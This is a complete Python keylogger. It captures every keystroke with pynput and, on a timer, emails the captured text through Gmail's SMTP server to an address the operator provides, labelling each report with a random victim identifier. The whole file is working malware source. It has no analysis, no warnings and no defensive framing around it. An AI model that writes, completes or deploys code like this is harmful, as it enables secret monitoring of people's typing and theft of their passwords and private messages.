#!/usr/bin/env python

import ssl
import pynput.keyboard as keyboard
import threading
import smtplib
from random import randrange
from email.message import EmailMessage

class KeyLogger:
    def __init__(self, interval, email, password):

        self._buffer = str('KeyLogger')
        self.interval = interval
        self.email = email
        self.password = password

        self.smtp_port = 465 
        identity = randrange(1, 999)

        self.msg = EmailMessage()
        self.msg['From'] = self.msg['To'] = self.email
        self.msg['Subject'] = 'Origin: ' + str(identity)

        self._server = smtplib.SMTP_SSL(
            host = "smtp.gmail.com",
            port = self.smtp_port,
            context = ssl.create_default_context()
        )


    def _key_pressed(self, key):
        try:
            self._buffer += str(key.char)

        except UnicodeEncodeError:
            self._buffer += '[UnicodeEncodeError]'

        except Exception:
            if key == keyboard.Key.space:
                self._buffer += ' '
            else:
                self._buffer += '{' + str(key) + '}'


    def _send_buffer(self):
        self._server.connect('smtp.gmail.com', self.smtp_port)
        self._server.login(self.email, self.password)
        
        self.msg.set_content(self._buffer)

        self._server.sendmail(
            from_addr = self.email,
            to_addrs = self.email,
            msg = self.msg.as_string()
        )

        self._server.quit()

    def _report(self):

        if self._buffer != '':
            self._send_buffer()
            self._buffer = str()

        timer = threading.Timer(
            interval = self.interval,
            function = self._report,
        )
        timer.start()
        

    def start(self):
        
        key_listener = keyboard.Listener(
            on_press = self._key_pressed
        )
        with key_listener as listener:
            self._report()
            listener.join()


    def stop(self):
        pass

